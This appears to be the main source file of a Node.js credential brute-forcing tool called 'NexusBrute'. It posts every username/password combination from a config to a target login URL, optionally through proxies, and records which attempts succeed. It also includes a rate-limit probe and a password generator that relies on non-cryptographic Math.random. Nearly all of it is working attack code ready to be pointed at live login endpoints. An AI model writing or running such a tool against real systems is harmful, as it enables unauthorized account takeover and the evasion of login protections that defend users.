const fs = require('fs').promises;
const crypto = require('crypto');
const axios = require('axios');
const chalk = require('chalk');

const CONFIG_FILE = 'config.json';
const RESULTS_JSON = 'brute_results.json';
const RESULTS_CSV = 'brute_results.csv';

// Load config
async function loadConfig() {
  try {
    const data = await fs.readFile(CONFIG_FILE);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red('[ERROR] Failed to load config.json:', err.message));
    process.exit(1);
  }
}

// Save results
async function saveResults(results) {
  try {
    await fs.writeFile(RESULTS_JSON, JSON.stringify(results, null, 2));
    const csv = ['Operation,Target,Result,Timestamp,Error']
        .concat(results.map(r => `"${r.operation}","${r.target}","${r.result}","${r.timestamp}","${r.error || ''}"`))
        .join('\n');
    await fs.writeFile(RESULTS_CSV, csv);
    console.log(chalk.green('[SUCCESS] Results saved to brute_results.json and brute_results.csv'));
  } catch (err) {
    console.error(chalk.red('[ERROR] Failed to save results:', err.message));
  }
}

// Load modules
const proxySupport = require('./modules/proxy_support');
const wordlistOptimizer = require('./modules/wordlist_optimizer');

// Smart Brute module
async function smartBrute(config) {
  const { targetUrl, usernames, passwords, delayMs, maxAttempts, useProxy } = config.smartBrute;
  const results = [];
  let attempts = 0;

  const axiosInstance = useProxy ? proxySupport.createProxyAxios(config.proxy) : axios;

  for (const username of usernames) {
    for (const password of passwords) {
      if (attempts >= maxAttempts) break;
      try {
        const response = await axiosInstance.post(targetUrl, { username, password }, { timeout: 5000 });
        results.push({
          operation: 'smart_brute',
          target: `${username}:${password}`,
          result: response.status === 200 ? 'Success' : 'Failed',
          timestamp: new Date().toISOString(),
          error: ''
        });
        console.log(chalk.cyan(`[ATTEMPT] ${username}:${password} -> ${response.status}`));
      } catch (err) {
        results.push({
          operation: 'smart_brute',
          target: `${username}:${password}`,
          result: 'Failed',
          timestamp: new Date().toISOString(),
          error: err.message
        });
        console.error(chalk.red(`[ERROR] ${username}:${password} -> ${err.message}`));
      }
      await new Promise(resolve => setTimeout(resolve, delayMs));
      attempts++;
    }
  }
  await saveResults(results);
}

// Password Generator module
function passwordGenerator(config) {
  const { length, count, useSpecialChars } = config.passwordGenerator;
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' + (useSpecialChars ? '!@#$%^&*' : '');
  const results = [];

  for (let i = 0; i < count; i++) {
    let password = '';
    for (let j = 0; j < length; j++) {
      password += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    results.push({
      operation: 'password_gen',
      target: 'generated_password',
      result: password,
      timestamp: new Date().toISOString(),
      error: ''
    });
  }
  saveResults(results);
  console.log(chalk.green(`[SUCCESS] Generated ${count} passwords`));
}

// Rate Limit Checker module
async function rateLimitChecker(config) {
  const { targetUrl, maxRequests, intervalMs, useProxy } = config.rateLimitChecker;
  const results = [];
  let blocked = false;

  const axiosInstance = useProxy ? proxySupport.createProxyAxios(config.proxy) : axios;

  for (let i = 0; i < maxRequests; i++) {
    try {
      const response = await axiosInstance.get(targetUrl, { timeout: 5000 });
      results.push({
        operation: 'rate_limit',
        target: targetUrl,
        result: `Request ${i + 1}: ${response.status}`,
        timestamp: new Date().toISOString(),
        error: ''
      });
      console.log(chalk.cyan(`[ATTEMPT ${i + 1}] Status: ${response.status}`));
    } catch (err) {
      blocked = true;
      results.push({
        operation: 'rate_limit',
        target: targetUrl,
        result: `Request ${i + 1}: Failed`,
        timestamp: new Date().toISOString(),
        error: err.message
      });
      console.error(chalk.red(`[ERROR] Request ${i + 1}: ${err.message}`));
      break;
    }
    await new Promise(resolve => setTimeout(resolve, intervalMs));
  }
  console.log(chalk.yellow(blocked ? '[INFO] Rate limit detected!' : '[INFO] No rate limit detected.'));
  await saveResults(results);
}

// Wordlist Optimizer module
async function wordlistOptimizerFn(config) {
  await wordlistOptimizer.optimize(config);
}

// Main function
async function main() {
  const config = await loadConfig();
  console.log(chalk.green('[NexusBrute] Initialized with config:', JSON.stringify(config, null, 2)));

  await wordlistOptimizerFn(config);
  await smartBrute(config);
  await passwordGenerator(config);
  await rateLimitChecker(config);
}

main().catch(err => console.error(chalk.red('[FATAL] NexusBrute crashed:', err.message)));